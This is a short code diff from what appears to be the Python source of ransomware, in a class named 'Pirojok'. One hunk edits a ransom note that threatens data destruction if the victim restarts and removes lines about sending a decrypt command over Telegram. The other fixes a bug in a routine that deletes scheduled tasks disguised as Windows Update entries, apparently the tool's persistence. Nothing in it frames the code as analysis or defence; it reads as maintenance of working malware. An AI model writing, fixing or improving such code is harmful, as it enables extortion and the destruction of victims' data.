@@ -1158,11 +1158,6 @@ pause > nul
 ║   DO NOT TRY TO RESTART YOUR COMPUTER                        ║
 ║   Otherwise your data will be destroyed                      ║
 ║                                                              ║
-║   To recover your files, send this command to Telegram:      ║
-║   ransom_decrypt {key_b64}                                   ║
-║                                                              ║
-║   Or use: ransom_key to get the key again                    ║
-║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
         """
             with open(note_path, 'w', encoding='utf-8') as f:
@@ -1587,7 +1582,7 @@ class Pirojok:
             results.append("[INFO] Not found in registry")
         
         subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], capture_output=True)
-        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture-output=True)
+        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture_output=True)
         results.append("[OK] Removed from task scheduler")
         
         if self.admin_mode:
